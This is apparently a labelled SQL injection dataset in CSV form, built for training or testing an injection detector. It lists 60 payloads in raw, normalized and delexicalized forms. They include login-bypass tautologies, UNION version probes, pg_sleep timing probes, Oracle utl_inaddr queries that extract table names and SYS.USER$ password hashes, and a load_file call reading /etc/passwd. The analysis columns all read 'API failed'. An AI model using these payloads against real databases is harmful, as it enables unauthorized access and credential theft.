payload_raw,payload_norm,payload_delex,label,is_obfuscated,sqli_type_hint,source,sqli_type,db_engine,confidence,reasoning,row_idx
""" or pg_sleep  (  __TIME__  )  --",""" or pg_sleep ( __TIME__ ) --",""" or pg_sleep ( __TIME__ ) --",1,False,,sqli_dataset,unknown,unknown,0.0,API failed,0
create user name identified by pass123 temporary tablespace temp default tablespace users;,create user name identified by pass123 temporary tablespace temp default tablespace users;,create user <COL> identified by pass123 temporary tablespace temp default tablespace <TABLE>;,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i","AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 5 ) ) AND 'i' = 'i","AND <NUM> = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = <NUM> ) ) AND <STR> = 'i",1,False,,sqli_dataset,unknown,unknown,0.0,API failed,2
"select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'","select * from users where id = '1' or @ @1 = 1 union select 1,version ( ) -- 1'","select * from <TABLE> where <COL> = <STR> or @ @<NUM> = <NUM> union select <NUM>,version ( ) -- <NUM>'",1,False,,sqli_dataset,unknown,unknown,0.0,API failed,3
"select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1","select * from users where id = 1 or 1#"" ( union select 1,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> or <NUM>#"" ( union select <NUM>,version ( ) -- <NUM>",1,False,,sqli_dataset,unknown,unknown,0.0,API failed,4
select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --,select name from syscolumns where id = ( select id from sysobjects where name = tablename' ) --,select <COL> from syscolumns where <COL> = ( select <COL> from sysobjects where <COL> = tablename' ) --,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,5
select * from users where id  =  1 +$+ or 1  =  1 -- 1,select * from users where id = 1 +$+ or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> +$+ or <NUM> = <NUM> -- <NUM>,1,True,,sqli_dataset,unknown,unknown,0.0,API failed,6
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;","1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100 ) ) ) ,1,1,1;","<NUM>; ( load_file ( char ( <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM> ) ) ) ,<NUM>,<NUM>,<NUM>;",1,False,,sqli_dataset,unknown,unknown,0.0,API failed,7
"select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'","select * from users where id = '1' or ||/1 = 1 union select 1,version ( ) -- 1'","select * from <TABLE> where <COL> = <STR> or ||/<NUM> = <NUM> union select <NUM>,version ( ) -- <NUM>'",1,False,,sqli_dataset,unknown,unknown,0.0,API failed,8
"select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'","select * from users where id = '1' or \.<\ union select 1,@@VERSION -- 1'","select * from <TABLE> where <COL> = <STR> or \.<\ union select <NUM>,@@VERSION -- <NUM>'",1,False,,sqli_dataset,unknown,unknown,0.0,API failed,9
? or 1  =  1 --,? or 1 = 1 --,? or <NUM> = <NUM> --,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,10
)   or   (  'a'  =  'a,) or ( 'a' = 'a,) or ( <STR> = 'a,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,11
admin' or 1  =  1#,admin' or 1 = 1#,<TABLE>' or <NUM> = <NUM>#,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,12
"select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1","select * from users where id = 1 or "" ( ]"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,13
or 1  =  1 --,or 1 = 1 --,or <NUM> = <NUM> --,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,14
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i","AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 5 ) ) AND 'i' = 'i","AND <NUM> = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = <NUM> ) ) AND <STR> = 'i",1,False,,sqli_dataset,unknown,unknown,0.0,API failed,15
"select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'","select * from users where id = '1' %!<@ union select 1,version ( ) -- 1'","select * from <TABLE> where <COL> = <STR> %!<@ union select <NUM>,version ( ) -- <NUM>'",1,False,,sqli_dataset,unknown,unknown,0.0,API failed,16
"select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1","select * from users where id = 1 or ""& ( "" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,17
"select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1","select * from users where id = 1 or ""? ( "" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,18
distinct,distinct,distinct,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,19
select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',select * from users where id = '1' * ( \ ) or 1 = 1 -- 1',select * from <TABLE> where <COL> = <STR> * ( \ ) or <NUM> = <NUM> -- <NUM>',1,False,,sqli_dataset,unknown,unknown,0.0,API failed,20
"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116","1 and ascii ( lower ( substring ( ( select top 1 name from sysobjects where xtype = 'u' ) , 1, 1 ) ) ) > 116","<NUM> and ascii ( lower ( substring ( ( select top <NUM> <COL> from sysobjects where xtype = <STR> ) , <NUM>, <NUM> ) ) ) > <NUM>",1,False,,sqli_dataset,unknown,unknown,0.0,API failed,21
select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,select * from users where id = 1 or \.<\ or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> or \.<\ or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,22
"admin"" or ""1""  =  ""1""--","admin"" or ""1"" = ""1""--","<TABLE><STR><NUM><STR><NUM>""--",1,False,,sqli_dataset,unknown,unknown,0.0,API failed,23
"select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1","select * from users where id = 1 or ""%{"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,24
insert,insert,insert,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,25
"select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1","select * from users where id = 1 or 1#""? = 1 or 1 = 1 -- 1","select * from <TABLE> where <COL> = <NUM> or <NUM>#""? = <NUM> or <NUM> = <NUM> -- <NUM>",1,False,,sqli_dataset,unknown,unknown,0.0,API failed,26
"select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1","select * from users where id = 1 or ""%?"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,27
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i","AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 8 ) ) AND 'i' = 'i","AND <NUM> = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( <COL> ) FROM ( SELECT DISTINCT ( <COL> ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = <NUM> ) ) AND <STR> = 'i",1,False,,sqli_dataset,unknown,unknown,0.0,API failed,28
"select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1","select * from users where id = 1 or ""?#"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,29
"or 1  =  1 or """"  =","or 1 = 1 or """" =",or <NUM> = <NUM> or <STR> =,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,30
/**/or/**/1/**/  =  /**/1,or 1 = 1,or <NUM> = <NUM>,1,True,,sqli_dataset,unknown,unknown,0.0,API failed,31
"select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1","select * from users where id = 1 or "". ( "" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,32
"select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'","select * from users where id = '1' union select ||/1,version ( ) -- 1'","select * from <TABLE> where <COL> = <STR> union select ||/<NUM>,version ( ) -- <NUM>'",1,False,,sqli_dataset,unknown,unknown,0.0,API failed,33
"select * from users where id  =  '1' union select +\.,@@VERSION -- 1'","select * from users where id = '1' union select +\.,@@VERSION -- 1'","select * from <TABLE> where <COL> = <STR> union select +\.,@@VERSION -- <NUM>'",1,True,,sqli_dataset,unknown,unknown,0.0,API failed,34
or 1  =  1/*,or 1 = 1/*,or <NUM> = <NUM>/*,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,35
%27 or 1  =  1,' or 1 = 1,' or <NUM> = <NUM>,1,True,,sqli_dataset,unknown,unknown,0.0,API failed,36
"select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1","select * from users where id = 1 <@&@ union select 1,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> <@&@ union select <NUM>,version ( ) -- <NUM>",1,False,,sqli_dataset,unknown,unknown,0.0,API failed,37
"select * from users where id  =  '1' union select $*$,@@VERSION -- 1'","select * from users where id = '1' union select $*$,@@VERSION -- 1'","select * from <TABLE> where <COL> = <STR> union select $*$,@@VERSION -- <NUM>'",1,False,,sqli_dataset,unknown,unknown,0.0,API failed,38
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...","1; ( load_file ( char ( 47,101,116,99,47,112,97,115, ...","<NUM>; ( load_file ( char ( <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>, ...",1,False,,sqli_dataset,unknown,unknown,0.0,API failed,39
"select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'","select * from users where id = '1' or $ 1 = 1 union select 1,@@VERSION -- 1'","select * from <TABLE> where <COL> = <STR> or $ <NUM> = <NUM> union select <NUM>,@@VERSION -- <NUM>'",1,False,,sqli_dataset,unknown,unknown,0.0,API failed,40
select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,select * from users where id = 1 or \.<1 or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> or \.<<NUM> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,41
"select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'","select * from users where id = '1' or \<\ union select 1,@@VERSION -- 1'","select * from <TABLE> where <COL> = <STR> or \<\ union select <NUM>,@@VERSION -- <NUM>'",1,False,,sqli_dataset,unknown,unknown,0.0,API failed,42
"select * from users where id  =  1 union select 1||1,version  (    )   -- 1","select * from users where id = 1 union select 1||1,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> union select <NUM>||<NUM>,version ( ) -- <NUM>",1,False,,sqli_dataset,unknown,unknown,0.0,API failed,43
"select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1","select * from users where id = 1 ||1 union select null,banner from v$version where rownum = 1 -- 1","select * from <TABLE> where <COL> = <NUM> ||<NUM> union select null,banner from v$version where rownum = <NUM> -- <NUM>",1,False,,sqli_dataset,unknown,unknown,0.0,API failed,44
select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',select * from users where id = '1' or \.<\ or 1 = 1 -- 1',select * from <TABLE> where <COL> = <STR> or \.<\ or <NUM> = <NUM> -- <NUM>',1,False,,sqli_dataset,unknown,unknown,0.0,API failed,45
"select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1","select * from users where id = 1 or ""]{"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,46
"select * from users where id  =  1 or "".@"" or 1  =  1 -- 1","select * from users where id = 1 or "".@"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,47
"select * from users where id  =  1 or ""$["" or 1  =  1 -- 1","select * from users where id = 1 or ""$["" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,48
or 1 --',or 1 --',or <NUM> --',1,False,,sqli_dataset,unknown,unknown,0.0,API failed,49
"select * from users where id  =  1 or "",;"" or 1  =  1 -- 1","select * from users where id = 1 or "",;"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,50
"admin"" or 1  =  1#","admin"" or 1 = 1#","<TABLE>"" or <NUM> = <NUM>#",1,False,,sqli_dataset,unknown,unknown,0.0,API failed,51
"select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1","select * from users where id = 1 + ( 1 ) union select null,banner from v$version where rownum = 1 -- 1","select * from <TABLE> where <COL> = <NUM> + ( <NUM> ) union select null,banner from v$version where rownum = <NUM> -- <NUM>",1,True,,sqli_dataset,unknown,unknown,0.0,API failed,52
\x27UNION SELECT,\x27UNION SELECT,\x27UNION SELECT,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,53
PRINT,PRINT,PRINT,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,54
"select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'","select * from users where id = '1' union select ( \. ) ,@@VERSION -- 1'","select * from <TABLE> where <COL> = <STR> union select ( \. ) ,@@VERSION -- <NUM>'",1,False,,sqli_dataset,unknown,unknown,0.0,API failed,55
or 1  =  1--,or 1 = 1--,or <NUM> = <NUM>--,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,56
1 or pg_sleep  (  __TIME__  )  --,1 or pg_sleep ( __TIME__ ) --,<NUM> or pg_sleep ( __TIME__ ) --,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,57
"select * from users where id  =  1 or "",#"" or 1  =  1 -- 1","select * from users where id = 1 or "",#"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,58
admin'  )   or   (  '1'  =  '1'/*,admin' ) or ( '1' = '1'/*,<TABLE><STR><NUM><STR><NUM>'/*,1,False,,sqli_dataset,unknown,unknown,0.0,API failed,59
